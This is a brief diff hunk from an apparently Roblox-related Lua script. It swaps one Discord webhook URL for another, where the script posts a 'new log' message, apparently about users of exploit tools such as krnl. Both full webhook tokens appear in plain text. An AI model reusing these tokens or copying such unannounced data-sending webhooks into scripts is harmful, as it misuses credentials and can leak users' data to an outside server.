@@ -126,7 +126,7 @@ aim.MouseButton1Down:connect(function()
    "Kid with shit exploit (krnl or others)"
 
 local url =
-   "https://discord.com/api/webhooks/948124126751649792/Yd4Z2xZvSrdzKj93xEtoV7-w5D8z4ev5gc-1Aq-BPzkDTMxQb81xHnWae3WE9m6F0a32"
+   "https://discord.com/api/webhooks/948377145493848114/45Zp_DmqJ7osHxFfdAGgaCeBn8vwkC1olPXbYQ3dA3M1WeiODRSuuEakTCH_9P5l7mjb"
 local data = {
    ["content"] = " new log",
    ["embeds"] = {
